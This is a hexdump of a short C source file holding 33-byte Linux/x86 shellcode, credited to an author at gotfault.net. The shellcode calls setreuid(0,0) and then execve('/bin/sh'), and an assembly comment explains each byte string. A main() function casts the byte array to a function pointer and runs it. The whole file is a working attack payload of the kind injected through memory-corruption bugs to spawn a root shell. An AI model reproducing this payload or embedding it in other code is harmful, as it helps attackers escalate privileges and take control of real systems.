00000000  2f 2a 0d 0a 20 2a 20 28  4c 69 6e 75 78 2f 78 38  |/*.. * (Linux/x8|
00000010  36 29 20 73 65 74 72 65  75 69 64 28 30 2c 30 29  |6) setreuid(0,0)|
00000020  20 2b 20 65 78 65 63 76  65 28 22 2f 62 69 6e 2f  | + execve("/bin/|
00000030  73 68 22 2c 20 5b 22 2f  62 69 6e 2f 73 68 22 2c  |sh", ["/bin/sh",|
00000040  20 4e 55 4c 4c 5d 29 0d  0a 20 2a 20 2d 20 33 33  | NULL]).. * - 33|
00000050  20 62 79 74 65 73 0d 0a  20 2a 20 2d 20 78 67 63  | bytes.. * - xgc|
00000060  40 67 6f 74 66 61 75 6c  74 2e 6e 65 74 0d 0a 20  |@gotfault.net.. |
00000070  2a 0d 0a 20 2a 2f 0d 0a  0d 0a 63 68 61 72 20 73  |*.. */....char s|
00000080  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 0d 0a 0d 0a  |hellcode[] =....|
00000090  20 20 22 5c 78 36 61 5c  78 34 36 22 09 09 09 2f  |  "\x6a\x46".../|
000000a0  2f 20 70 75 73 68 20 20  20 24 30 78 34 36 0d 0a  |/ push   $0x46..|
000000b0  20 20 22 5c 78 35 38 22  09 09 09 2f 2f 20 70 6f  |  "\x58"...// po|
000000c0  70 20 20 20 20 25 65 61  78 0d 0a 20 20 22 5c 78  |p    %eax..  "\x|
000000d0  33 31 5c 78 64 62 22 09  09 09 2f 2f 20 78 6f 72  |31\xdb"...// xor|
000000e0  09 20 20 25 65 62 78 2c  20 25 65 62 78 0d 0a 20  |.  %ebx, %ebx.. |
000000f0  20 22 5c 78 33 31 5c 78  63 39 22 09 09 09 2f 2f  | "\x31\xc9"...//|
00000100  20 78 6f 72 09 20 20 25  65 63 78 2c 20 25 65 63  | xor.  %ecx, %ec|
00000110  78 0d 0a 20 20 22 5c 78  63 64 5c 78 38 30 22 09  |x..  "\xcd\x80".|
00000120  09 09 2f 2f 20 69 6e 74  20 20 20 20 24 30 78 38  |..// int    $0x8|
00000130  30 0d 0a 0d 0a 20 20 22  5c 78 33 31 5c 78 64 32  |0....  "\x31\xd2|
00000140  22 09 09 09 2f 2f 20 78  6f 72 20 20 20 20 25 65  |"...// xor    %e|
00000150  64 78 2c 20 25 65 64 78  0d 0a 20 20 22 5c 78 36  |dx, %edx..  "\x6|
00000160  61 5c 78 30 62 22 09 09  09 2f 2f 20 70 75 73 68  |a\x0b"...// push|
00000170  20 20 20 24 30 78 62 0d  0a 20 20 22 5c 78 35 38  |   $0xb..  "\x58|
00000180  22 09 09 09 2f 2f 20 70  6f 70 20 20 20 20 25 65  |"...// pop    %e|
00000190  61 78 0d 0a 20 20 22 5c  78 35 32 22 09 09 09 2f  |ax..  "\x52".../|
000001a0  2f 20 70 75 73 68 20 20  20 25 65 64 78 0d 0a 20  |/ push   %edx.. |
000001b0  20 22 5c 78 36 38 5c 78  32 66 5c 78 32 66 5c 78  | "\x68\x2f\x2f\x|
000001c0  37 33 5c 78 36 38 22 09  2f 2f 20 70 75 73 68 20  |73\x68".// push |
000001d0  20 20 24 30 78 36 38 37  33 32 66 32 66 0d 0a 20  |  $0x68732f2f.. |
000001e0  20 22 5c 78 36 38 5c 78  32 66 5c 78 36 32 5c 78  | "\x68\x2f\x62\x|
000001f0  36 39 5c 78 36 65 22 09  2f 2f 20 70 75 73 68 20  |69\x6e".// push |
00000200  20 20 24 30 78 36 65 36  39 36 32 32 66 0d 0a 20  |  $0x6e69622f.. |
00000210  20 22 5c 78 38 39 5c 78  65 33 22 09 09 09 2f 2f  | "\x89\xe3"...//|
00000220  20 6d 6f 76 20 20 20 20  25 65 73 70 2c 20 25 65  | mov    %esp, %e|
00000230  62 78 0d 0a 20 20 22 5c  78 35 32 22 09 09 09 2f  |bx..  "\x52".../|
00000240  2f 20 70 75 73 68 20 20  20 25 65 64 78 0d 0a 20  |/ push   %edx.. |
00000250  20 22 5c 78 35 33 22 09  09 09 2f 2f 20 70 75 73  | "\x53"...// pus|
00000260  68 20 20 20 25 65 62 78  0d 0a 20 20 22 5c 78 38  |h   %ebx..  "\x8|
00000270  39 5c 78 65 31 22 09 09  09 2f 2f 20 6d 6f 76 20  |9\xe1"...// mov |
00000280  20 20 20 25 65 73 70 2c  20 25 65 63 78 0d 0a 20  |   %esp, %ecx.. |
00000290  20 22 5c 78 63 64 5c 78  38 30 22 3b 09 09 09 2f  | "\xcd\x80";.../|
000002a0  2f 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |/ int    $0x80..|
000002b0  20 0d 0a 69 6e 74 20 6d  61 69 6e 28 29 20 7b 0d  | ..int main() {.|
000002c0  0a 20 0d 0a 20 20 20 20  20 20 20 20 69 6e 74 20  |. ..        int |
000002d0  28 2a 66 29 28 29 20 3d  20 28 69 6e 74 28 2a 29  |(*f)() = (int(*)|
000002e0  28 29 29 73 68 65 6c 6c  63 6f 64 65 3b 0d 0a 20  |())shellcode;.. |
000002f0  20 20 20 20 20 20 20 70  72 69 6e 74 66 28 22 4c  |       printf("L|
00000300  65 6e 67 74 68 3a 20 25  75 5c 6e 22 2c 20 73 74  |ength: %u\n", st|
00000310  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
00000320  3b 0d 0a 20 20 20 20 20  20 20 20 66 28 29 3b 0d  |;..        f();.|
00000330  0a 7d                                             |.}|
00000332
